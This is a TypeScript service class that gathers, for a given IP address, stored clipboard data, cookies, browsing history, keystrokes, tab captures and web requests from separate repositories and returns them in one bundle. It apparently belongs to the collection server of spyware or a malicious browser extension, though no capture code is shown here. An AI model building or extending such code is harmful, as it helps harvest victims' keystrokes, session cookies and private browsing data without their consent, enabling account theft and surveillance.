import ClipboardRepository from '../repositories/clipboard.repository';
import BulkRetrieveDto from '../repositories/DataTransferObjects/bulkRetriever.dto';
import CookieRepository from '../repositories/cookies.repository';
import HistoryRepository from '../repositories/history.repository';
import KeystrokeRepository from '../repositories/keystrokes.repository';
import TabCaptureRepository from '../repositories/tabCapture.repository';
import WebRequestRepository from '../repositories/webRequest.repository';

export default class BulkRetrieverService {
  private clipboardRepository = new ClipboardRepository();

  private cookieRepository = new CookieRepository();

  private historyRepository = new HistoryRepository();

  private keystrokeRepository = new KeystrokeRepository();

  private tabCaptureRepository = new TabCaptureRepository();

  private webRequestRepository = new WebRequestRepository();

  public retrieveForIP = async (IP: string): Promise<BulkRetrieveDto> => {
    const clipboardData = await this.clipboardRepository.getDataForIP(IP);
    const cookieData = await this.cookieRepository.getDataForIP(IP);
    const historyData = await this.historyRepository.getDataForIP(IP);
    const keystrokeData = await this.keystrokeRepository.getDataForIP(IP);
    const tabCaptureData = await this.tabCaptureRepository.getDataForIP(IP);
    const webRequestData = await this.webRequestRepository.getDataForIP(IP);
    return {
      digestable: {
        clipboard: clipboardData,
        cookies: cookieData,
        history: historyData,
        keystrokes: keystrokeData,
      },
      tabCatures: tabCaptureData,
      webRequests: webRequestData,
    };
  };
}
